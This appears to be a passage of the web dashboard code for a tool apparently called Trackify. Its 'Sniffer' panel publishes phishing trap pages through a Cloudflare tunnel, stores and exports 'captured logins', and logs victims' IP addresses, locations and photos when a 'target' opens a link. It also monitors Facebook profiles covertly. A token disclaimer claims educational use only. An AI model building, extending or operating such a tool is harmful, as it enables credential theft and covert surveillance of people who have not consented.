                    <div>
                        <div class="card" style="margin-bottom:20px">
                            <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap">
                                <h2 style="margin-bottom:0">Image Preview</h2>
                                <div style="display:flex;gap:8px;align-items:center">
                                    <button class="btn btn-secondary" type="button" id="exifPreviewZoomIn" onclick="exiftoolPreviewZoom(1.2)" title="Zoom in" aria-label="Zoom in" style="width:44px;padding:0">+</button>
                                    <button class="btn btn-secondary" type="button" id="exifPreviewZoomOut" onclick="exiftoolPreviewZoom(1/1.2)" title="Zoom out" aria-label="Zoom out" style="width:44px;padding:0">−</button>
                                    <button class="btn btn-secondary" type="button" id="exifPreviewReset" onclick="exiftoolPreviewReset()" title="Reset zoom" aria-label="Reset zoom" style="width:44px;padding:0">↺</button>
                                </div>
                            </div>
                            <div id="exifPreviewStage" style="margin-top:14px;background:rgba(33,38,45,.5);border:1px solid var(--border);border-radius:12px;min-height:240px;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative">
                                <div id="exifPreviewEmpty" style="color:var(--text-muted);font-size:13px;padding:18px;text-align:center">Choose an image to preview it here.</div>
                                <img id="exifPreviewImg" src="" alt="Selected image preview" style="display:none;max-width:100%;max-height:320px;transform-origin:center center;transition:transform 0.12s ease">
                            </div>
                            <div id="exifPreviewMeta" style="margin-top:12px;display:none;border:1px solid var(--border);border-radius:12px;padding:12px 14px;background:rgba(13,17,23,.35)">
                                <div style="display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;font-size:13px">
                                    <div style="color:var(--text-muted)">File size:</div>
                                    <div id="exifPreviewSize" style="font-family:'JetBrains Mono', monospace"></div>
                                </div>
                                <div style="display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;font-size:13px;margin-top:8px">
                                    <div style="color:var(--text-muted)">Type:</div>
                                    <div id="exifPreviewType" style="font-family:'JetBrains Mono', monospace"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section id="saveInfoLayout" class="phone-layout" style="display:none" aria-label="Sniffer">
            <div class="phone-layout-inner">
                <div class="phone-layout-columns phone-layout-columns--saveinfo">
                    <div class="save-info-stack">
                        <div class="card">
                            <h2>Sniffer</h2>
                            <p class="subtitle card-view-desc" style="color:var(--text-muted)">
                                Sniffer is a themed capture flow with advanced handling for traffic through your Sniffer links—pick a template, publish over your tunnel, and review stored submissions (up to <span id="savedInfoMax">500</span>) with export in one place.
                            </p>
                            <div class="phone-lookup-input-wrap">
                                <label for="siTemplate">Template</label>
                                <select id="siTemplate">
                                    <option value="">Loading templates…</option>
                                </select>
                            </div>
                            <div id="siTemplateHint" class="phone-lookup-error" style="margin-top:8px;border:none;padding:0;color:var(--text-muted);font-size:13px" hidden></div>
                            <div class="phone-lookup-actions" style="margin-top:16px">
                                <button type="button" class="btn btn-primary btn-generate" id="siGenerateBtn" onclick="generateSaveInfoLink()">
                                    <svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                                    <span>Generate</span>
                                </button>
                            </div>
                            <div id="siLinkBox" class="link-box" style="display:none;margin-top:16px">
                                <input type="text" class="link-input" id="siTrackerLink" readonly>
                                <button type="button" class="btn btn-secondary" onclick="copySaveInfoLink()">Copy</button>
                                <button type="button" class="btn btn-danger" id="siStopBtn" onclick="stopService()">Stop</button>
                            </div>
                        </div>
                        <div class="card card-terminal-panel">
                            <div class="terminal-card-head">
                                <h2>Terminal</h2>
                                <span class="terminal-card-badge terminal-card-badge--saveinfo" aria-hidden="true">Sniffer</span>
                            </div>
                            <div id="saveInfoTerminalWrap" class="phone-lookup-results" style="margin-top:0" aria-live="polite">
                                <div class="phone-lookup-terminal" id="saveInfoTerminal">
                                    <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Sniffer tunnel log (same Cloudflare tunnel as Trackify when shared).</div>
                                    <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:sniffer# </span><span class="terminal-cursor"></span></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="phone-history">
                        <div class="card saved-logins-card">
                            <div class="saved-logins-card-head">
                                <h2>Captured logins</h2>
                                <span class="saved-logins-count" id="savedInfoCountMeta" aria-live="polite"></span>
                            </div>
                            <div class="saved-logins-toolbar">
                                <button type="button" class="btn btn-secondary" id="exportSavedInfoBtn" onclick="exportSavedInfoCsv()" disabled>Export CSV</button>
                                <button type="button" class="btn btn-danger" id="clearSavedInfoBtn" onclick="clearSavedInfo()">Clear all</button>
                            </div>
                            <div id="savedInfoWrap" class="saved-info-wrap" aria-live="polite">
                                <div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Sniffer link and submit the trap page form.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="fbmonitorLayout" class="phone-layout" style="display:none" aria-label="Account Checker — profiles and pages">
            <div class="phone-layout-inner">
                <div class="phone-layout-columns phone-layout-columns--fbmonitor">
                    <div class="card fb-monitor-card">
                        <div class="fb-monitor-page-head">
                            <div>
                                <h2>Account Checker</h2>
                                <p class="subtitle card-view-desc fb-monitor-desc" style="color:var(--text-muted);margin:0">
                                    Watch Facebook profiles or pages and get Telegram alerts when something you monitor becomes accessible again.
                                </p>
                            </div>
                            <div class="fb-monitor-page-actions">
                                <button type="button" class="fb-monitor-btn-add" onclick="fbMonitorOpenAddModal()">+ Add profile or page</button>
                                <button type="button" class="btn btn-primary" id="fbMonitorCheckAllBtn" onclick="fbMonitorCheckAll()">Check all</button>
                            </div>
                        </div>

                        <div class="fb-monitor-search-card">
                            <span class="fb-monitor-search-label">Filter list</span>
                            <div class="fb-monitor-search-row">
                                <label for="fbMonitorSearch" class="fb-monitor-search-wrap">
                                    <span class="fb-monitor-search-icon" aria-hidden="true">🔍</span>
                                    <input type="search" id="fbMonitorSearch" placeholder="Search by name, URL, or status…" autocomplete="off">
                                </label>
                                <div class="fb-monitor-search-actions">
                                    <button type="button" class="fb-monitor-refresh-btn" id="fbMonitorTableRefreshBtn" onclick="fbMonitorRefreshTable()" title="Refresh table">
                                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M23 4v6h-6"/><path d="M1 20v-6h6"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>
                                        Refresh
                                    </button>
                                    <button type="button" class="fb-monitor-bulk-delete-btn" id="fbMonitorBulkDeleteBtn" onclick="fbMonitorOpenBulkRemoveModal()" hidden title="Bulk remove selected rows" aria-label="Bulk remove selected rows">
                                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M3 6h18M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6M8 6V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
                                        <span>Bulk Remove</span><span class="fb-monitor-bulk-count" id="fbMonitorBulkCount"></span>
                                    </button>
                                </div>
                            </div>
                        </div>

                        <div class="fb-monitor-table-card">
                            <div class="fb-monitor-table-title">Monitored profiles &amp; pages</div>
                            <div class="saved-info-table-scroll" id="fbMonitorTableWrap" style="max-height:min(520px,55vh)">
                                <table class="saved-info-table" id="fbMonitorTable" aria-label="Monitored Facebook profiles and pages">
                                    <thead>
                                        <tr>
                                            <th scope="col" class="fb-monitor-col-check">
                                                <input type="checkbox" id="fbMonitorSelectAll" title="Select all on this page" aria-label="Select all on this page" disabled>
                                            </th>
                                            <th scope="col">Name</th>
                                            <th scope="col">Facebook URL</th>
                                            <th scope="col">Status</th>
                                            <th scope="col" class="saved-info-col-time">Last checked</th>
                                            <th scope="col" style="min-width:15rem">Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody id="fbMonitorTableBody" class="fb-monitor-tbody" aria-live="polite"></tbody>
                                </table>
                            </div>
                            <nav class="fb-monitor-pagination" id="fbMonitorPagination" aria-label="Monitored profiles list pages" hidden></nav>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <div class="lightbox" id="lightbox" onclick="closeLightbox()" role="dialog" aria-modal="true" aria-label="Full size capture">
        <button type="button" class="lightbox-close" onclick="event.stopPropagation(); closeLightbox();" aria-label="Close">×</button>
        <img id="lightboxImg" src="" alt="Capture full size" onclick="event.stopPropagation()">
    </div>

    <div class="toast" id="toast">Copied to clipboard!</div>

    <div class="modal-overlay" id="disclaimerModal" onclick="closeDisclaimer(event)">
        <div class="modal-content" onclick="event.stopPropagation()">
            <h2 class="modal-title">Disclaimer</h2>
            <div class="modal-body">
                <p>This tool is intended for educational and authorized security testing purposes only.</p>
                <p>Use of this software to track, monitor, or collect information from individuals without their explicit consent may violate privacy laws and regulations in your jurisdiction.</p>
                <p>You are solely responsible for ensuring your use complies with all applicable laws. The developers assume no liability for misuse of this software.</p>
            </div>
            <button class="modal-close" onclick="closeDisclaimer()">I Understand</button>
        </div>
    </div>

    <div class="modal-overlay" id="fbMonitorAddModal" role="dialog" aria-modal="true" aria-labelledby="fbMonitorAddModalTitle" onclick="fbMonitorCloseAddModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()" style="max-width:440px">
            <h2 class="modal-title" id="fbMonitorAddModalTitle">Add profile or page</h2>
            <p style="font-size:13px;color:var(--text-muted);margin:-8px 0 16px;line-height:1.45">Enter a Facebook profile or page URL and a display name for your list.</p>
            <div class="fb-monitor-modal-fields">
                <div class="phone-lookup-input-wrap">
                    <label for="fbMonitorUrlInput">Facebook URL</label>
                    <input type="url" id="fbMonitorUrlInput"
                           placeholder="https://www.facebook.com/username or …/pagename"
                           autocomplete="off">
                </div>
                <div class="phone-lookup-input-wrap">
                    <label for="fbMonitorNameInput">Name <span style="color:#f85149" aria-hidden="true">*</span></label>
                    <input type="text" id="fbMonitorNameInput"
                           placeholder="e.g. John Doe"
                           autocomplete="off"
                           required
                           maxlength="191"
                           aria-required="true">
                </div>
                <div id="fbMonitorAddError" class="phone-lookup-error" role="alert" hidden></div>
            </div>
            <div class="fb-monitor-modal-actions">
                <button type="button" class="btn btn-primary" onclick="fbMonitorAdd()">Save</button>
                <button type="button" class="btn btn-secondary" onclick="fbMonitorCloseAddModal()">Cancel</button>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="fbMonitorRowLogModal" role="dialog" aria-modal="true" aria-labelledby="fbMonitorRowLogModalTitle" onclick="fbMonitorCloseRowLogModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()" style="max-width:520px">
            <h2 class="modal-title" id="fbMonitorRowLogModalTitle">Check log</h2>
            <p id="fbMonitorRowLogModalSub" style="font-size:12px;color:var(--text-muted);margin:-6px 0 12px;word-break:break-all;line-height:1.45"></p>
            <pre class="fb-monitor-log-terminal fb-monitor-row-log-terminal" id="fbMonitorRowLogTerminal" style="max-height:min(360px,50vh);margin:0"></pre>
            <button type="button" class="btn btn-secondary" style="width:100%;margin-top:14px" onclick="fbMonitorCloseRowLogModal()">Close</button>
        </div>
    </div>

    <div class="modal-overlay" id="fbMonitorRemoveModal" role="dialog" aria-modal="true" aria-labelledby="fbMonitorRemoveModalTitle" onclick="fbMonitorCloseRemoveModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()" style="max-width:400px">
            <h2 class="modal-title" id="fbMonitorRemoveModalTitle">Remove from monitoring?</h2>
            <p style="font-size:14px;color:var(--text-muted);margin:-6px 0 20px;line-height:1.55">This URL will be removed from your list. You can add it again later from <strong style="color:var(--text)">Account Checker</strong>.</p>
            <div class="fb-monitor-modal-actions" style="margin-top:0">
                <button type="button" class="btn btn-danger" onclick="fbMonitorConfirmRemove()">Remove</button>
                <button type="button" class="btn btn-secondary" onclick="fbMonitorCloseRemoveModal()">Cancel</button>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="fbMonitorBulkRemoveModal" role="dialog" aria-modal="true" aria-labelledby="fbMonitorBulkRemoveModalTitle" onclick="fbMonitorCloseBulkRemoveModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()" style="max-width:420px">
            <h2 class="modal-title" id="fbMonitorBulkRemoveModalTitle">Remove selected?</h2>
            <p id="fbMonitorBulkRemoveModalBody" style="font-size:14px;color:var(--text-muted);margin:-6px 0 20px;line-height:1.55"></p>
            <div class="fb-monitor-modal-actions" style="margin-top:0">
                <button type="button" class="btn btn-danger" onclick="fbMonitorConfirmBulkRemove()">Remove</button>
                <button type="button" class="btn btn-secondary" onclick="fbMonitorCloseBulkRemoveModal()">Cancel</button>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="galleryDeleteModal" role="dialog" aria-modal="true" aria-labelledby="galleryDeleteModalTitle" onclick="galleryDeleteCloseModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()" style="max-width:400px">
            <h2 class="modal-title" id="galleryDeleteModalTitle">Delete capture?</h2>
            <p id="galleryDeleteModalBody" style="font-size:14px;color:var(--text-muted);margin:-6px 0 20px;line-height:1.55"></p>
            <div class="fb-monitor-modal-actions" style="margin-top:0">
                <button type="button" class="btn btn-danger" onclick="galleryDeleteConfirm()">Delete</button>
                <button type="button" class="btn btn-secondary" onclick="galleryDeleteCloseModal()">Cancel</button>
            </div>
        </div>
    </div>

    <div class="support-float" aria-live="polite">
        <div class="support-prompt" id="supportPrompt">
            If you want to support this project and help continue development, you can support me on Ko-fi.
            <div class="support-prompt-actions">
                <a class="support-link-btn" href="https://ko-fi.com/0cod3" target="_blank" rel="noopener noreferrer">Support on Ko-fi</a>
                <button type="button" class="support-dismiss-btn" id="supportContinueBtn">Continue</button>
            </div>
        </div>
        <a class="support-fab" href="https://ko-fi.com/0cod3" target="_blank" rel="noopener noreferrer" aria-label="Support this project on Ko-fi">
            ☕ Support on Ko-fi
        </a>
    </div>

    <script>
        const API = 'api.php';

        function escapeHtmlAttr(s) {
            return String(s)
                .replace(/&/g, '&amp;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#39;');
        }

        const terminalEl = document.getElementById('terminal');
        const saveInfoTerminalEl = document.getElementById('saveInfoTerminal');
        const linkBox = document.getElementById('linkBox');
        const tunnelControlsWrap = document.getElementById('tunnelControlsWrap');
        const trackerLinkInput = document.getElementById('trackerLink');

        function syncTrackifyTunnelRow(link, showStop) {
            const wrap = tunnelControlsWrap || document.getElementById('tunnelControlsWrap');
            const box = linkBox || document.getElementById('linkBox');
            const stopBtnEl = document.getElementById('stopBtn');
            if (!wrap || !box) {
                return;
            }
            const hasLink = !!(link && String(link).trim());
            if (!hasLink && !showStop) {
                wrap.style.display = 'none';
                box.style.display = 'none';
                box.classList.remove('link-box--stop-only');
                if (stopBtnEl) {
                    stopBtnEl.style.display = 'none';
                }
                return;
            }
            wrap.style.display = 'block';
            box.style.display = 'flex';
            box.classList.toggle('link-box--stop-only', !hasLink && showStop);
            if (stopBtnEl) {
                stopBtnEl.style.display = showStop ? 'inline-flex' : 'none';
            }
        }
        const generateBtn = document.getElementById('generateBtn');
        const GENERATE_BTN_IDLE_HTML = '<svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg><span>Generate</span>';
        const SI_GENERATE_BTN_IDLE_HTML = GENERATE_BTN_IDLE_HTML;
        const statusDisplay = document.getElementById('statusDisplay');
        const statusLink = document.getElementById('statusLink');
        const capturesList = document.getElementById('capturesList');
        let currentPage = 1;
        let lastSavedInfoEntries = [];

        async function syncPayloadOptions() {
            const formData = new FormData();
            formData.append('template', document.getElementById('template').value);
            formData.append('yt_video_id', document.getElementById('ytVideoId').value || 'dQw4w9WgXcQ');
            try {
                const res = await fetch(API + '?action=update_payload', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status === 'success' && data.regenerated && data.payload_ok === false) {
                    addTerminalLine('[!] Template files not updated — check write permission on trap-*.html / index.php', 'dim');
                }
            } catch (e) {}
        }

        document.getElementById('template').addEventListener('change', function() {
            document.getElementById('ytVideoIdWrap').style.display = this.value === '1' ? 'block' : 'none';
            syncPayloadOptions();
        });

        document.getElementById('ytVideoId').addEventListener('change', function() {
            syncPayloadOptions();
        });

        async function loadSaveInfoTemplates() {
            const sel = document.getElementById('siTemplate');
            const hint = document.getElementById('siTemplateHint');
            if (!sel) {
                return;
            }
            try {
                const res = await fetch(API + '?action=saveinfo_templates', { credentials: 'same-origin' });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success' || !Array.isArray(data.templates)) {
                    sel.innerHTML = '<option value="">Could not load templates</option>';
                    return;
                }
                const prev = sel.value;
                sel.innerHTML = '';
                let n = 0;
                data.templates.forEach(function (t) {
                    if (!t.readable) {
                        return;
                    }
                    const o = document.createElement('option');
                    o.value = t.slug;
                    o.textContent = t.label;
                    sel.appendChild(o);
                    n++;
                });
                if (n === 0) {
                    sel.innerHTML = '<option value="">No templates found</option>';
                    if (hint) {
                        hint.hidden = false;
                        hint.textContent = 'Add .html files under saveinfo-templates/ and register them in api.php (saveinfo_templates_registry).';
                    }
                    return;
                }
                if (hint) {
                    hint.hidden = true;
                }
                const hasOpt = function (val) {
                    return val && Array.prototype.some.call(sel.options, function (o) { return o.value === val; });
                };
                let pick = null;
                if (hasOpt(data.active_template)) {
                    pick = data.active_template;
                } else if (hasOpt(prev)) {
                    pick = prev;
                } else if (sel.options[0] && sel.options[0].value) {
                    pick = sel.options[0].value;
                }
                if (pick) {
                    sel.value = pick;
                }
                await syncSaveInfoPayload({ silent: true });
            } catch (e) {
                sel.innerHTML = '<option value="">Load failed</option>';
            }
        }

        async function syncSaveInfoPayload(options) {
            const silent = options && options.silent;
            const sel = document.getElementById('siTemplate');
            if (!sel || !sel.value) {
                return;
            }
            const formData = new FormData();
            formData.append('template', sel.value);
            try {
                const res = await fetch(API + '?action=saveinfo_update_payload', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status === 'success') {
                    if (data.regenerated && data.payload_ok && !silent) {
                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + data.template + '" is live. Re-open your Sniffer URL or hard-refresh the trap page (Ctrl+F5).', 'green');
                    }
                    if (data.regenerated && data.payload_ok === false) {
                        addTerminalLineTo(saveInfoTerminalEl, '[!] Sniffer template files not updated — check saveinfo-templates/ and saveinfo_entry.php permissions', 'dim');
                    }
                } else if (data.status === 'error' && data.message && !silent) {
                    const skip = 'Generate a Sniffer link first';
                    if (String(data.message).indexOf(skip) === -1) {
                        addTerminalLineTo(saveInfoTerminalEl, '[!] ' + data.message, 'dim');
                    }
                }
            } catch (e) {}
        }

        document.getElementById('siTemplate').addEventListener('change', function() {
            syncSaveInfoPayload({ silent: false });
        });

        function addTerminalLineTo(rootEl, text, cls) {
            if (!rootEl) {
                return;
            }
            const line = document.createElement('div');
            line.className = 'phone-lookup-terminal-line' + (cls ? ' ' + cls : '');
            line.textContent = '  ' + text;
            const prompt = rootEl.querySelector('.phone-lookup-terminal-line:last-child');
            if (prompt) {
                rootEl.insertBefore(line, prompt);
            } else {
                rootEl.appendChild(line);
            }
            rootEl.scrollTop = rootEl.scrollHeight;
        }

        function addTerminalLine(text, cls) {
            addTerminalLineTo(terminalEl, text, cls == null ? '' : cls);
        }

        function appendTerminalEventToRoot(rootEl, ev) {
            if (!rootEl) {
                return;
            }
            if (ev.type === 'location') {
                addTerminalLineTo(rootEl, '', 'green');
                addTerminalLineTo(rootEl, '[+] New Target Opened the Link!', 'green');
                ev.content.split('\n').forEach(function (l) {
                    if (l.trim()) {
                        addTerminalLineTo(rootEl, l, 'cyan');
                    }
                });
            } else if (ev.type === 'ip') {
                addTerminalLineTo(rootEl, '', 'green');
                addTerminalLineTo(rootEl, '[+] Target opened the link!', 'green');
                ev.content.split('\n').forEach(function (l) {
                    if (l.trim()) {
                        addTerminalLineTo(rootEl, l, 'cyan');
                    }
                });
            } else if (ev.type === 'photo') {
                addTerminalLineTo(rootEl, '', 'green');
                addTerminalLineTo(rootEl, '[+] Victim\'s Photo Received!', 'green');
            } else if (ev.type === 'saved_login') {
                addTerminalLineTo(rootEl, '', 'green');
                addTerminalLineTo(rootEl, '[+] ' + ev.content, 'green');
            }
        }

        async function generateLink() {
            generateBtn.disabled = true;
            generateBtn.innerHTML = '<span>Starting tunnel...</span>';
            addTerminalLine('[+] Starting Cloudflare tunnel...', 'yellow');
            addTerminalLine('[+] Starting php server... (localhost:8000)', 'yellow');

            const formData = new FormData();
            formData.append('template', document.getElementById('template').value);
            formData.append('yt_video_id', document.getElementById('ytVideoId').value || 'dQw4w9WgXcQ');

            try {
                const startRes = await fetch(API + '?action=start', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const startData = await startRes.json().catch(() => ({}));
                if (startData.status === 'error') {
                    addTerminalLine('[!] ' + (startData.message || 'Start failed'), 'dim');
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
                    return;
                }
            } catch (e) {
                addTerminalLine('[!] Error: ' + e.message, 'dim');
                generateBtn.disabled = false;
                generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
                return;
            }

            addTerminalLine('[+] Waiting for Cloudflare tunnel link...', 'yellow');
            pollForLink();
        }

        async function pollForLink() {
            let lastExcerpt = '';
            for (let i = 0; i < 90; i++) {
                await new Promise(r => setTimeout(r, 1000));
                const res = await fetch(API + '?action=link', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.tunnel_log_excerpt) {
                    lastExcerpt = data.tunnel_log_excerpt;
                }
                if (data.status === 'forbidden' || data.status === 'error') {
                    addTerminalLine('[!] ' + (data.message || 'Could not claim tunnel for your account'), 'dim');
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
                    return;
                }
                if (data.link) {
                    if (data.payload_ok === false) {
                        addTerminalLine('[!] Tunnel is up but trap-*.html was not written — fix permissions on the project root', 'dim');
                    } else if (data.template_id != null) {
                        addTerminalLine('[+] Template #' + data.template_id + ' → /' + (data.trap_file || 'trap-?.html') + ' (if wrong page: hard refresh or private window)', 'dim');
                    }
                    trackerLinkInput.value = data.link;
                    syncTrackifyTunnelRow(data.link, true);
                    addTerminalLine('', 'green');
                    addTerminalLine('[+] Tracker Link: ' + data.link, 'green');
                    addTerminalLine('', 'green');
                    addTerminalLine('[*] Waiting for targets, Press Ctrl + C to exit...', 'yellow');
                    statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
                    statusLink.textContent = data.link;
                    document.getElementById('stopBtnSidebar').style.display = 'block';
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
                    loadPhotos(1);
                    loadCaptures();
                    checkStatus();
                    return;
                }
            }
            addTerminalLine('[!] Timeout: Could not get tunnel link (waited 90s).', 'dim');
            if (lastExcerpt) {
                addTerminalLine('[!] cloudflared log: ' + lastExcerpt, 'dim');
            } else {
                addTerminalLine('[!] Install cloudflared, confirm tunnel_origin in config.php reaches your PHP server, and that this machine can reach Cloudflare.', 'dim');
            }
            generateBtn.disabled = false;
            generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
        }

        async function generateSaveInfoLink() {
            const siBtn = document.getElementById('siGenerateBtn');
            if (!siBtn) {
                return;
            }
            siBtn.disabled = true;
            siBtn.innerHTML = '<span>Starting tunnel...</span>';
            addTerminalLineTo(saveInfoTerminalEl, '[+] Sniffer: starting or reusing Cloudflare tunnel...', 'yellow');

            const siSel = document.getElementById('siTemplate');
            const slug = siSel && siSel.value;
            if (!slug) {
                addTerminalLineTo(saveInfoTerminalEl, '[!] Select a Sniffer template first.', 'dim');
                siBtn.disabled = false;
                siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                return;
            }

            const formData = new FormData();
            formData.append('template', slug);

            try {
                const startRes = await fetch(API + '?action=saveinfo_start', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const startData = await startRes.json().catch(() => ({}));
                if (startData.status === 'error') {
                    addTerminalLineTo(saveInfoTerminalEl, '[!] ' + (startData.message || 'Start failed'), 'dim');
                    siBtn.disabled = false;
                    siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                    return;
                }
                if (startData.status === 'ready' && startData.link) {
                    const siLinkBox = document.getElementById('siLinkBox');
                    const siInput = document.getElementById('siTrackerLink');
                    const siStop = document.getElementById('siStopBtn');
                    if (startData.reused_tunnel) {
                        addTerminalLineTo(saveInfoTerminalEl, '[+] Reusing existing tunnel.', 'yellow');
                    }
                    if (startData.payload_ok === false) {
                        addTerminalLineTo(saveInfoTerminalEl, '[!] Tunnel OK but saveinfo trap files were not written — check project permissions', 'dim');
                    } else if (startData.template_slug) {
                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + startData.template_slug + '" → /' + (startData.trap_file || 'saveinfo-trap-?.html'), 'dim');
                    }
                    if (siLinkBox) {
                        siLinkBox.style.display = 'flex';
                    }
                    if (siInput) {
                        siInput.value = startData.link;
                    }
                    if (siStop) {
                        siStop.style.display = 'inline-flex';
                    }
                    addTerminalLineTo(saveInfoTerminalEl, '', 'green');
                    addTerminalLineTo(saveInfoTerminalEl, '[+] Sniffer URL: ' + startData.link, 'green');
                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this Sniffer URL (not the site root).', 'yellow');
                    siBtn.disabled = false;
                    siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                    checkStatus();
                    return;
                }
            } catch (e) {
                addTerminalLineTo(saveInfoTerminalEl, '[!] Error: ' + e.message, 'dim');
                siBtn.disabled = false;
                siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                return;
            }

            addTerminalLineTo(saveInfoTerminalEl, '[+] Waiting for tunnel URL...', 'yellow');
            pollForSaveInfoLink();
        }

        async function pollForSaveInfoLink() {
            const siBtn = document.getElementById('siGenerateBtn');
            let lastExcerpt = '';
            for (let i = 0; i < 90; i++) {
                await new Promise(function (r) { setTimeout(r, 1000); });
                const res = await fetch(API + '?action=saveinfo_link', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.tunnel_log_excerpt) {
                    lastExcerpt = data.tunnel_log_excerpt;
                }
                if (data.status === 'forbidden' || data.status === 'error') {
                    addTerminalLineTo(saveInfoTerminalEl, '[!] ' + (data.message || 'Could not get Sniffer link'), 'dim');
                    if (siBtn) {
                        siBtn.disabled = false;
                        siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                    }
                    return;
                }
                if (data.link) {
                    if (data.payload_ok === false) {
                        addTerminalLineTo(saveInfoTerminalEl, '[!] Tunnel is up but saveinfo-trap-*.html was not written — fix permissions', 'dim');
                    } else if (data.template_slug) {
                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + data.template_slug + '" → /' + (data.trap_file || 'saveinfo-trap-?.html'), 'dim');
                    }
                    const siLinkBox = document.getElementById('siLinkBox');
                    const siInput = document.getElementById('siTrackerLink');
                    const siStop = document.getElementById('siStopBtn');
                    if (siLinkBox) {
                        siLinkBox.style.display = 'flex';
                    }
                    if (siInput) {
                        siInput.value = data.link;
                    }
                    if (siStop) {
                        siStop.style.display = 'inline-flex';
                    }
                    addTerminalLineTo(saveInfoTerminalEl, '', 'green');
                    addTerminalLineTo(saveInfoTerminalEl, '[+] Sniffer URL: ' + data.link, 'green');
                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this link (ends in saveinfo_entry.php).', 'yellow');
                    if (siBtn) {
                        siBtn.disabled = false;
                        siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                    }
                    checkStatus();
                    return;
                }
            }
            addTerminalLineTo(saveInfoTerminalEl, '[!] Timeout: no tunnel URL (90s).', 'dim');
            if (lastExcerpt) {
                addTerminalLineTo(saveInfoTerminalEl, '[!] cloudflared log: ' + lastExcerpt, 'dim');
            }
            if (siBtn) {
                siBtn.disabled = false;
                siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
            }
        }

        async function stopService() {
            const stopBtn = document.getElementById('stopBtn');
            const stopBtnSidebar = document.getElementById('stopBtnSidebar');
            stopBtn.disabled = true;
            stopBtnSidebar.disabled = true;
            try {
                const res = await fetch(API + '?action=stop', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.status === 'success') {
                    addTerminalLine('', 'dim');
                    addTerminalLine('[+] Tunnel stopped.', 'dim');
                    addTerminalLineTo(saveInfoTerminalEl, '', 'dim');
                    addTerminalLineTo(saveInfoTerminalEl, '[+] Tunnel stopped (Sniffer URL no longer valid).', 'dim');
                    trackerLinkInput.value = '';
                    syncTrackifyTunnelRow(null, false);
                    statusDisplay.innerHTML = '<span class="status-badge inactive">Tunnel inactive</span>';
                    statusLink.textContent = '';
                    stopBtnSidebar.style.display = 'none';
                    const siBox = document.getElementById('siLinkBox');
                    const siIn = document.getElementById('siTrackerLink');
                    const siSt = document.getElementById('siStopBtn');
                    if (siBox) {
                        siBox.style.display = 'none';
                    }
                    if (siIn) {
                        siIn.value = '';
                    }
                    if (siSt) {
                        siSt.style.display = 'none';
                    }
